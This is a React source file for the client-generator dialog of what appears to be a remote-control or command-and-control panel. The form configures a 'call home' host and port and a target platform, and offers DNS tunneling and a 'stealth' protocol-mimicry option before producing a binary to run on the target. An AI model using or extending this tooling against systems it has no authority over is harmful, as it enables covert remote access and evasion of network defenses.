import React, {useState} from 'react';
import {Modal, Form, Input, InputNumber, Button, Alert, Divider, Checkbox, Row, Col, Cascader} from 'antd';
import {GlobalOutlined, ApiOutlined, CloudOutlined, ThunderboltOutlined, ExperimentOutlined} from '@ant-design/icons';
import {post, request} from "../../utils/utils";
import prebuilt from '../../config/prebuilt.json';
import i18n from "../../locale/locale";
import './generate.css';

function Generate({visible, onCancel}) {
	const [form] = Form.useForm();
	const [loading, setLoading] = useState(false);
	const [notice, setNotice] = useState('');
	const [preview, setPreview] = useState('');
	const [enableQUIC, setEnableQUIC] = useState(false);
	const [enableLongPoll, setEnableLongPoll] = useState(false);
	const [enableDNS, setEnableDNS] = useState(false);
	const [enableMimicry, setEnableMimicry] = useState(false);

	React.useEffect(() => {
		if (visible) {
			const initValues = getInitValues();
			form.setFieldsValue(initValues);
			setPreview(buildPreview(initValues));
		}
	}, [visible, form]);

	function getInitValues() {
		let pathname = location.pathname || `/`;
		if (!pathname.startsWith(`/`)) {
			pathname = `/` + pathname;
		}
		let port = location.port;
		if (String(location.port).length === 0) {
			port = location.protocol === 'https:' ? 443 : 80;
		}
		return {
			host: location.hostname,
			port: port,
			path: pathname,
			ArchOS: ['windows', 'amd64'],
			enable_quic: false,
			quic_port: 443,
			enable_longpoll: false,
			enable_dns: false,
			dns_domain: '',
			dns_server: '8.8.8.8',
			enable_mimicry: false
		};
	}

	function buildPreview(values) {
		if (!values) return '';
		const host = values.host || location.hostname;
		const port = values.port || (location.protocol === 'https:' ? 443 : 80);
		let path = values.path || '/';
		if (!path.startsWith('/')) path = '/' + path;
		return `${location.protocol}//${host}:${port}${path}`;
	}

	async function onFinish(values) {
		setLoading(true);
		setNotice('');

		try {
			// Transform ArchOS array to os and arch
			if (values?.ArchOS?.length === 2) {
				values.os = values.ArchOS[0];
				values.arch = values.ArchOS[1];
				delete values.ArchOS;
			}

			// Set secure based on current protocol
			values.secure = location.protocol === 'https:' ? 'true' : 'false';

			// Convert boolean to string for backend
			values.enable_quic = enableQUIC ? 'true' : 'false';
			values.enable_longpoll = enableLongPoll ? 'true' : 'false';
			values.enable_dns = enableDNS ? 'true' : 'false';
			values.enable_mimicry = enableMimicry ? 'true' : 'false';

			let basePath = location.origin + location.pathname + 'api/client/';
			const res = await request(basePath + 'check', values);

			if (res.data.code === 0) {
				post(basePath + 'generate', values);
				setNotice(i18n.t('GENERATOR.NEXT_STEPS') || 'Download starts in your browser. Run the binary on the target and keep this host/port reachable.');
			}
		} catch (err) {
			console.error('Generate error:', err);
			setNotice('');
		} finally {
			setLoading(false);
		}
	}

	function onValuesChange(changedValues, allValues) {
		setPreview(buildPreview(allValues));
	}

	function handleCancel() {
		form.resetFields();
		setNotice('');
		setEnableQUIC(false);
		setEnableLongPoll(false);
		setEnableDNS(false);
		setEnableMimicry(false);
		onCancel();
	}

	return (
		<Modal
			title={i18n.t('GENERATOR.TITLE') || 'Generate Client'}
			open={visible}
			onCancel={handleCancel}
			footer={null}
			width={760}
			centered
			destroyOnClose
			maskClosable={false}
			className="generate-modal"
		>
			<div className="generate-form">
				{notice && (
					<Alert
						type="info"
						showIcon
						message={notice}
						description={i18n.t('GENERATOR.NEXT_STEPS_DESC') || 'If download is blocked, copy the generated link and fetch it from a host behind your firewall. Keep the port open so the client can call home.'}
						className="generate-alert"
					/>
				)}

				<Alert
					type="warning"
					showIcon
					message={i18n.t('GENERATOR.NOTE') || 'The binary will call home using the connection details below.'}
					className="generate-alert"
				/>

				<Form
					form={form}
					layout="vertical"
					onFinish={onFinish}
					onValuesChange={onValuesChange}
					autoComplete="off"
				>
					{/* Primary Connection Section */}
					<div className="generate-section">
						<div className="generate-section-title">
							<GlobalOutlined />
							{i18n.t('GENERATOR.CONNECTION') || 'Primary Connection'}
						</div>
						<div className="generate-section-description">
							Configure the primary WebSocket connection endpoint
						</div>

						<Row gutter={16}>
							<Col xs={24} sm={12}>
								<Form.Item
									name="host"
									label={i18n.t('GENERATOR.HOST') || 'Host'}
									rules={[{required: true, message: i18n.t('GENERATOR.HOST_REQUIRED') || 'Host is required'}]}
								>
									<Input placeholder="gapict.com" />
								</Form.Item>
							</Col>
							<Col xs={24} sm={12}>
								<Form.Item
									name="port"
									label={i18n.t('GENERATOR.PORT') || 'Port'}
									rules={[{required: true, message: i18n.t('GENERATOR.PORT_REQUIRED') || 'Port is required'}]}
								>
									<InputNumber min={1} max={65535} placeholder="8443" style={{width: '100%'}} />
								</Form.Item>
							</Col>
						</Row>

						<Row gutter={16}>
							<Col xs={24} sm={12}>
								<Form.Item
									name="path"
									label={i18n.t('GENERATOR.PATH') || 'Path'}
									rules={[{required: true, message: i18n.t('GENERATOR.PATH_REQUIRED') || 'Path is required'}]}
								>
									<Input placeholder="/" />
								</Form.Item>
							</Col>
							<Col xs={24} sm={12}>
								<Form.Item
									name="ArchOS"
									label={i18n.t('GENERATOR.OS_ARCH') || 'Target OS/Arch'}
									rules={[{required: true, message: i18n.t('GENERATOR.OS_ARCH_REQUIRED') || 'OS/Arch is required'}]}
								>
									<Cascader options={prebuilt} placeholder="Select OS and Architecture" />
								</Form.Item>
							</Col>
						</Row>

						{preview && (
							<div className="generate-preview">
								<div className="generate-preview-label">Connection Preview</div>
								<div className="generate-preview-url">{preview}</div>
							</div>
						)}
					</div>

					<Divider className="generate-divider" />

					{/* Transport Fallback Section */}
					<div className="generate-section">
						<div className="generate-section-title">
							<ApiOutlined />
							{i18n.t('GENERATOR.FALLBACK') || 'Transport Fallback Options'}
						</div>
						<div className="generate-section-description">
							Enable alternative communication methods when WebSocket is blocked
						</div>

						{/* QUIC Transport */}
						<div className="generate-fallback-item">
							<div className="generate-fallback-header">
								<Form.Item name="enable_quic" valuePropName="checked" noStyle>
									<Checkbox onChange={(e) => setEnableQUIC(e.target.checked)}>
										<ThunderboltOutlined style={{marginRight: 8}} />
										Enable QUIC (UDP) Transport
									</Checkbox>
								</Form.Item>
							</div>
							{enableQUIC && (
								<div className="generate-fallback-fields">
									<Form.Item
										name="quic_port"
										label="QUIC Port"
										rules={[{required: enableQUIC, message: 'QUIC port is required'}]}
									>
										<InputNumber min={1} max={65535} placeholder="443" style={{width: '100%'}} />
									</Form.Item>
								</div>
							)}
						</div>

						{/* Long Polling */}
						<div className="generate-fallback-item">
							<div className="generate-fallback-header">
								<Form.Item name="enable_longpoll" valuePropName="checked" noStyle>
									<Checkbox onChange={(e) => setEnableLongPoll(e.target.checked)}>
										<CloudOutlined style={{marginRight: 8}} />
										Enable Long Polling (HTTP Fallback)
									</Checkbox>
								</Form.Item>
							</div>
						</div>

						{/* DNS Tunneling */}
						<div className="generate-fallback-item">
							<div className="generate-fallback-header">
								<Form.Item name="enable_dns" valuePropName="checked" noStyle>
									<Checkbox onChange={(e) => setEnableDNS(e.target.checked)}>
										<GlobalOutlined style={{marginRight: 8}} />
										Enable DNS Tunneling
									</Checkbox>
								</Form.Item>
							</div>
							{enableDNS && (
								<div className="generate-fallback-fields">
									<Form.Item
										name="dns_domain"
										label="DNS Domain"
										rules={[{required: enableDNS, message: 'DNS domain is required'}]}
									>
										<Input placeholder="tunnel.gapict.com" />
									</Form.Item>
									<Form.Item
										name="dns_server"
										label="DNS Server"
										rules={[{required: enableDNS, message: 'DNS server is required'}]}
									>
										<Input placeholder="8.8.8.8" />
									</Form.Item>
								</div>
							)}
						</div>

						{/* Protocol Mimicry */}
						<div className="generate-fallback-item">
							<div className="generate-fallback-header">
								<Form.Item name="enable_mimicry" valuePropName="checked" noStyle>
									<Checkbox onChange={(e) => setEnableMimicry(e.target.checked)}>
										<ExperimentOutlined style={{marginRight: 8}} />
										Enable Protocol Mimicry (Stealth Mode)
									</Checkbox>
								</Form.Item>
							</div>
						</div>
					</div>

					{/* Footer Buttons */}
					<div style={{marginTop: 32, display: 'flex', justifyContent: 'flex-end', gap: 12}}>
						<Button
							onClick={handleCancel}
							disabled={loading}
							className="generate-cancel-button"
						>
							{i18n.t('COMMON.CANCEL') || 'Cancel'}
						</Button>
						<Button
							type="primary"
							htmlType="submit"
							loading={loading}
							disabled={loading}
							className="generate-button"
						>
							{loading ? 'Generating...' : (i18n.t('COMMON.OK') || 'Generate')}
						</Button>
					</div>
				</Form>
			</div>
		</Modal>
	);
}

export default Generate;
